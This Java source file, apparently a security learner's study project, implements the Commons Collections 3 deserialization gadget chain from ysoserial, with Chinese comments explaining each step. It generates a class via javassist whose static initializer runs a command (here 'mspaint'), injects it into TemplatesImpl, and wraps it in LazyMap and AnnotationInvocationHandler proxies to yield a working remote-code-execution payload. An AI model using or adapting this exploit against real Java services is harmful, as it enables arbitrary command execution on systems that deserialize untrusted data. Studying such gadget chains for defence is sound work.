package com.pinger.javasec.ysoserial;

import com.pinger.javasec.util.SerialUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import javax.xml.transform.Templates;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * @author : p1n93r
 * @date : 2021/4/1 19:22
 * CC3 Gadget分析
 */
public class CC3 {

    /**
     * 需要一个空类作为javassist的模板
     */
    public static class Placeholder {}

    public static Object getPayload() throws Exception{
        // 恶意的类需要继承此类，否则最终在TemplatesImpl#defineTransletClasses()会异常
        String abstractTransletClassPath = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";

        // 使用javassist生成一个恶意的类
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(CC3.Placeholder.class));
        classPool.insertClassPath(new ClassClassPath(Class.forName(abstractTransletClassPath)));

        CtClass placeholder = classPool.get(CC3.Placeholder.class.getName());
        placeholder.setSuperclass(classPool.get(Class.forName(abstractTransletClassPath).getName()));
        // 这里insertBefore还是After都一样，反正都是在静态初始化块里写代码
        placeholder.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\"mspaint\");");
        placeholder.setName("EvalClass");
        // 得到恶意类的字节码
        byte[] evalByte = placeholder.toBytecode();

        // 实例化TemplatesImpl对象,并将恶意字节码植入
        TemplatesImpl templates = new TemplatesImpl();
        Class<? extends TemplatesImpl> templatesClass = templates.getClass();
        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates,new byte[][]{evalByte});
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"p1n93r");


        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(1)
        });

        // 真正的RCE执行链，调用TrAXFilter构造器时，会调用TemplatesImpl#newTransformer()，之后就是和CC2一样了
        Transformer[] trueTransformer = {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        // 仍旧使用LazyMap即可
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map evalMap = LazyMap.decorate(hashMap, chainedTransformer);

        // 创建AnnotationInvocationHandler对象，封装lazyMap
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, evalMap);

        // 得到代理Map
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, invocationHandler);

        // 再次创建AnnotationInvocationHandler对象，封装proxyMap
        InvocationHandler res = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        // 最后再将真正的transformer chain传入,防止反序列化之前在攻击机中就执行了命令
        Class<? extends Transformer> chainClass = chainedTransformer.getClass();
        Field iTransformers = chainClass.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer,trueTransformer);
        return res;
    }

    public static void main(String[] args)throws Exception {
        Object payload = getPayload();
        SerialUtil.runPayload(payload);
    }
}
